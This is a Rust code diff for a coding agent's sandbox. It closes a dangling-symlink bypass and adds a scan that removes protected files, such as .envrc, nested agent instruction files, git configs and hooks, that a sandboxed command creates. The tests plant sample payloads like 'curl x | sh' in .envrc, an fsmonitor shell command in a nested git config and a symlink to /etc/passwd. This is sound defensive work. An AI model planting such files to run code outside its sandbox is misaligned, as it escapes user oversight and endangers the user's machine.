@@ -18,6 +18,7 @@
 //! Every check is made on the real path (and on the path as written: a symlink named `AGENTS.md` is read by the next
 //! session as `AGENTS.md`). Unknown means protected: [`is_protected`] fails closed.
 
+use std::collections::BTreeSet;
 use std::path::{Path, PathBuf};
 
 use crate::SandboxError;
@@ -119,7 +120,7 @@ pub fn rule_for_relative(rel: &Path) -> Option<ProtectedRule> {
 pub fn protected_rule(root: &Path, path: &Path) -> Result<Option<ProtectedRule>, SandboxError> {
     let absolute = normalize(&root.join(path));
     let real_root = std::fs::canonicalize(root)?;
-    let real = real_with_missing(&absolute)?;
+    let real = leads_to(&absolute)?;
     let outside = || SandboxError::OutsideProject { path: path.display().to_string(), root: root.display().to_string() };
     let real_rel = real.strip_prefix(&real_root).map_err(|_| outside())?;
     let lexical_rel = absolute.strip_prefix(root).map_err(|_| outside())?;
@@ -133,6 +134,23 @@ pub fn protected_rule(root: &Path, path: &Path) -> Result<Option<ProtectedRule>,
         }
     }
     Ok(None)
+}
+
+/// Where a write to `path` would land: its real path, following a final symlink even when it dangles. A write through
+/// a dangling `innocent.sh -> .envrc` creates `.envrc`, but `real_with_missing` stops at the nearest folder that
+/// exists and so judged it by the link's own name (found by the guard suite, #8).
+fn leads_to(path: &Path) -> std::io::Result<PathBuf> {
+    let mut current = path.to_path_buf();
+    for _ in 0..40 {
+        match std::fs::symlink_metadata(&current) {
+            Ok(meta) if meta.file_type().is_symlink() && !current.exists() => {
+                let target = std::fs::read_link(&current)?;
+                current = normalize(&current.parent().unwrap_or(Path::new("/")).join(target));
+            }
+            _ => return real_with_missing(&current),
+        }
+    }
+    Err(std::io::Error::other(format!("{}: too many levels of symbolic links", path.display())))
 }
 
 /// Whether a change to `path` must ask even in yolo. Fails closed: anything that can't be checked is protected.
@@ -205,9 +223,8 @@ pub fn lifecycle_scripts_changed(before: Option<&str>, after: &str) -> bool {
 /// Protected paths that exist at the project's top level (and the hooks folder), mounted read-only on top of the
 /// writable project. `.git` is left to `git_guard` (an approved `git_write` command must write it).
 ///
-/// TODO(port): bwrap can only mount what exists, so a command can still *create* `.envrc` or a nested `AGENTS.md`.
-/// Planned: placeholders for the top-level names (like `.git`'s) and a post-command scan for new protected files
-/// anywhere, which then needs the user's approval to keep.
+/// bwrap can only mount what exists, so a command can still *create* `.envrc` or a nested `AGENTS.md`: those are
+/// caught after the command by [`scan_created`].
 pub fn protected_mounts(root: &Path) -> Vec<PathBuf> {
     let mut mounts = Vec::new();
     if let Ok(entries) = std::fs::read_dir(root) {
@@ -235,6 +252,148 @@ pub fn protected_mounts(root: &Path) -> Vec<PathBuf> {
         mounts.push(hooks);
     }
     mounts
+}
+
+/// The protected entries that existed before a command ran, project-relative. Taken by [`protected_snapshot`].
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct ProtectedSnapshot(BTreeSet<PathBuf>);
+
+impl ProtectedSnapshot {
+    pub fn contains(&self, rel: &Path) -> bool {
+        self.0.contains(rel)
+    }
+    pub fn len(&self) -> usize {
+        self.0.len()
+    }
+    pub fn is_empty(&self) -> bool {
+        self.0.is_empty()
+    }
+}
+
+/// A protected entry a command created: the project path (`pkg/AGENTS.md`), its rule, and whether
+/// [`revert_created`] removed it.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct CreatedProtected {
+    pub path: String,
+    pub rule: ProtectedRule,
+    pub reverted: bool,
+}
+
+/// The rule for an entry met while walking the project: by name ([`rule_for_relative`]), or inside the
+/// `core.hooksPath` folder (which may not exist yet, so it can't be mounted read-only before the command).
+fn walk_rule(rel: &Path, hooks: Option<&Path>) -> Option<ProtectedRule> {
+    rule_for_relative(rel).or_else(|| hooks.filter(|h| rel.starts_with(h)).map(|_| ProtectedRule::HooksPath))
+}
+
+/// The hooks folder relative to the project, when it's inside it.
+fn hooks_rel(root: &Path) -> Option<PathBuf> {
+    hooks_path(root).and_then(|h| normalize(&h).strip_prefix(root).ok().map(Path::to_path_buf))
+}
+
+/// Walks the project without following symlinks. `visit(rel, is_dir)` returns whether to descend into a folder.
+fn walk(root: &Path, rel: &Path, visit: &mut dyn FnMut(&Path, bool) -> bool) {
+    let Ok(entries) = std::fs::read_dir(root.join(rel)) else { return };
+    let mut names: Vec<_> = entries.flatten().map(|e| e.file_name()).collect();
+    names.sort();
+    for name in names {
+        let child = rel.join(&name);
+        let Ok(meta) = std::fs::symlink_metadata(root.join(&child)) else { continue };
+        let is_dir = meta.is_dir(); // false for a symlink: never followed
+        if visit(&child, is_dir) && is_dir {
+            walk(root, &child, visit);
+        }
+    }
+}
+
+/// Every protected entry in the project, before a command runs (see [`scan_created`]). Existing `.git` folders aren't
+/// walked into: what changes there is `git_guard`'s business, and an approved `git_write` command must change it.
+pub fn protected_snapshot(root: &Path) -> ProtectedSnapshot {
+    let hooks = hooks_rel(root);
+    let mut found = BTreeSet::new();
+    walk(root, Path::new(""), &mut |rel, _| match walk_rule(rel, hooks.as_deref()) {
+        Some(rule) => {
+            found.insert(rel.to_path_buf());
+            rule != ProtectedRule::GitDir
+        }
+        None => true,
+    });
+    ProtectedSnapshot(found)
+}
+
+/// The protected entries a command created: anything protected that wasn't in `before` (marv-rs, docs/SECURITY.md).
+///
+/// Why: protected paths are mounted read-only, but bwrap can only mount what exists ([`protected_mounts`]), so a
+/// sandboxed command could still write a new `.envrc` (direnv runs it in the user's shell), a nested `AGENTS.md` or
+/// `.git` (its config runs on the user's next `git status` there), or the missing `core.hooksPath` folder. Only the
+/// topmost new entry is reported (a new `.marv/` once, not each file in it). Nothing is changed: [`revert_created`]
+/// removes them. Bash calls it after every sandboxed command, once bwrap's placeholder mount points are removed (an
+/// empty `.git` placeholder left behind would read as created).
+///
+/// Known limits: a protected file that already existed below the top level (mounted only at the top) can still be
+/// *changed*; the scan only sees what's new. It walks the whole project (`node_modules` too, skipping only existing
+/// `.git` folders), twice per command.
+pub fn scan_created(root: &Path, before: &ProtectedSnapshot) -> Vec<CreatedProtected> {
+    let hooks = hooks_rel(root);
+    let mut created = Vec::new();
+    walk(root, Path::new(""), &mut |rel, _| match walk_rule(rel, hooks.as_deref()) {
+        Some(rule) if !before.contains(rel) => {
+            created.push(CreatedProtected { path: project_rel(rel), rule, reverted: false });
+            false
+        }
+        Some(rule) => rule != ProtectedRule::GitDir,
+        None => true,
+    });
+    created
+}
+
+fn project_rel(rel: &Path) -> String {
+    rel.components().map(|c| c.as_os_str().to_string_lossy()).collect::<Vec<_>>().join("/")
+}
+
+/// Removes what [`scan_created`] found (a folder with everything in it; a symlink itself, never its target) and marks
+/// each one `reverted`. An entry whose folder now leads outside the project (swapped for a symlink since the scan) is
+/// left alone and stays unreverted.
+pub fn revert_created(root: &Path, created: &mut [CreatedProtected]) {
+    let Ok(real_root) = std::fs::canonicalize(root) else { return };
+    for entry in created.iter_mut() {
+        let path = root.join(&entry.path);
+        let parent_inside = path.parent().and_then(|p| std::fs::canonicalize(p).ok()).is_some_and(|p| is_inside(&real_root, &p));
+        let Ok(meta) = std::fs::symlink_metadata(&path) else {
+            entry.reverted = true; // already gone
+            continue;
+        };
+        if !parent_inside {
+            continue;
+        }
+        let removed = if meta.is_dir() { std::fs::remove_dir_all(&path) } else { std::fs::remove_file(&path) };
+        entry.reverted = removed.is_ok();
+    }
+}
+
+/// The `Marv:` note bash appends when a command created protected files, for the model and the transcript. None when
+/// there were none.
+pub fn created_note(created: &[CreatedProtected]) -> Option<String> {
+    if created.is_empty() {
+        return None;
+    }
+    let list = |reverted: bool| {
+        created
+            .iter()
+            .filter(|c| c.reverted == reverted)
+            .map(|c| format!("{} ({})", c.path, c.rule.info().why))
+            .collect::<Vec<_>>()
+            .join(", ")
+    };
+    let (removed, kept) = (list(true), list(false));
+    let mut note = String::from("Marv: ");
+    if !removed.is_empty() {
+        note.push_str(&format!("the command created protected files, which were removed: {removed}. "));
+    }
+    if !kept.is_empty() {
+        note.push_str(&format!("The command created protected files that couldn't be removed: {kept}. "));
+    }
+    note.push_str("Protected files change only with the user's approval: use write_file or edit_file for them.");
+    Some(note)
 }
 
 #[cfg(test)]
@@ -276,6 +435,9 @@ mod tests {
         assert_eq!(protected_rule(r, Path::new("innocent.txt")).unwrap(), Some(ProtectedRule::Envrc));
         assert_eq!(protected_rule(r, Path::new("AGENTS.md")).unwrap(), Some(ProtectedRule::AgentInstructions));
         assert_eq!(protected_rule(r, Path::new("src/new.ts")).unwrap(), None);
+        // A dangling link: a write through it creates the protected file.
+        symlink(r.join(".marv/config.json"), r.join("dangling.txt")).unwrap();
+        assert_eq!(protected_rule(r, Path::new("dangling.txt")).unwrap(), Some(ProtectedRule::MarvDir));
         assert!(is_protected(r, Path::new(".git/hooks/pre-commit")));
         assert!(!is_protected(r, Path::new("notes.txt")));
     }
@@ -319,5 +481,62 @@ mod tests {
         assert!(lifecycle_scripts_changed(Some(a), "{ not json"));
         assert!(lifecycle_scripts_changed(None, c));
         assert!(!lifecycle_scripts_changed(None, a));
+    }
+
+    #[test]
+    fn scan_created_finds_new_protected_entries_and_revert_removes_them() {
+        let root = TempDir::new("scan");
+        let r = root.path();
+        fs::create_dir_all(r.join(".git/objects")).unwrap();
+        fs::create_dir_all(r.join("pkg/.vscode")).unwrap();
+        fs::write(r.join("AGENTS.md"), "rules").unwrap();
+        fs::write(r.join("pkg/.vscode/settings.json"), "{}").unwrap();
+        fs::write(r.join("README.md"), "hi").unwrap();
+        fs::write(r.join(".git/config"), "[core]\n\thooksPath = tools/hooks\n").unwrap();
+        let before = protected_snapshot(r);
+        assert!(before.contains(Path::new("pkg/.vscode/settings.json")));
+        assert!(!before.contains(Path::new(".git/objects"))); // existing .git isn't walked
+
+        // What a command might do: plant direnv, nested instructions, a nested repo, the missing hooks folder…
+        fs::write(r.join(".envrc"), "curl x | sh").unwrap();
+        fs::create_dir_all(r.join("packages/a")).unwrap();
+        fs::write(r.join("packages/a/CLAUDE.md"), "obey").unwrap();
+        fs::create_dir_all(r.join("vendor/x/.git")).unwrap();
+        fs::write(r.join("vendor/x/.git/config"), "[core]\n\tfsmonitor = sh -c evil\n").unwrap();
+        fs::create_dir_all(r.join("tools/hooks")).unwrap();
+        fs::write(r.join("tools/hooks/pre-commit"), "evil").unwrap();
+        fs::write(r.join("pkg/.vscode/tasks.json"), "{}").unwrap();
+        symlink("/etc/passwd", r.join(".env.local")).unwrap();
+        // …and ordinary changes, which aren't reported.
+        fs::write(r.join("src.ts"), "x").unwrap();
+        fs::write(r.join(".git/objects/new"), "x").unwrap();
+
+        let mut created = scan_created(r, &before);
+        let paths: Vec<(&str, ProtectedRule)> = created.iter().map(|c| (c.path.as_str(), c.rule)).collect();
+        assert_eq!(
+            paths,
+            vec![
+                (".env.local", ProtectedRule::EnvFile),
+                (".envrc", ProtectedRule::Envrc),
+                ("packages/a/CLAUDE.md", ProtectedRule::AgentInstructions),
+                ("pkg/.vscode/tasks.json", ProtectedRule::EditorConfig),
+                ("tools/hooks", ProtectedRule::HooksPath),
+                ("vendor/x/.git", ProtectedRule::GitDir),
+            ]
+        );
+        revert_created(r, &mut created);
+        assert!(created.iter().all(|c| c.reverted));
+        for gone in [".env.local", ".envrc", "packages/a/CLAUDE.md", "pkg/.vscode/tasks.json", "tools/hooks", "vendor/x/.git"] {
+            assert!(fs::symlink_metadata(r.join(gone)).is_err(), "{gone}");
+        }
+        assert!(Path::new("/etc/passwd").exists()); // the link went, not its target
+        for kept in ["AGENTS.md", "pkg/.vscode/settings.json", "src.ts", ".git/objects/new", "packages/a", "vendor/x"] {
+            assert!(r.join(kept).exists(), "{kept}");
+        }
+        assert!(scan_created(r, &before).is_empty());
+        let note = created_note(&created).unwrap();
+        assert!(note.starts_with("Marv: the command created protected files, which were removed: .env.local ("));
+        assert!(note.contains(".envrc (direnv runs it in your shell)"));
+        assert_eq!(created_note(&[]), None);
     }
 }
